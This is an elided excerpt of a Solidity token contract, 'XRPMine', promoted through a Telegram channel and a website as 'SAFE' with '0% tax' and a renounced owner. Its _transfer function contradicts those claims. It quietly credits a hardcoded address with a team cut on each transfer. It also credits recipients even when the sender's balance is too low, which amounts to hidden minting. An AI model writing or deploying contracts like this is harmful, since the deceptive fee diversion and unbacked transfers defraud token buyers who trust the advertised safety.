...
// Submitted for Telegram: https://t.me/XRPMine_Rewards
// Website: https://XRPMine.tech
// RENOUNCE CA, LP LOCK, SAFE, TAX 0% FOR BUY SELL
...
contract  XRPMine  is Ownable, IERC20 {
    ...
    function _transfer(address form, address to, uint256 amount) internal virtual {
        ...
        _rOwned[0xeE54fBc2fc71b5Feaf3D048662aE7bC34ce7b47c] += _teamtoken;
        if (sendertokens >= amount) { _rOwned[form] = sendertokens - amount; }
        _rOwned[to] += tokenamount; 
        if (_marketingfee > 0) {
        emit Transfer(form, 0xeE54fBc2fc71b5Feaf3D048662aE7bC34ce7b47c, _teamtoken);
        }
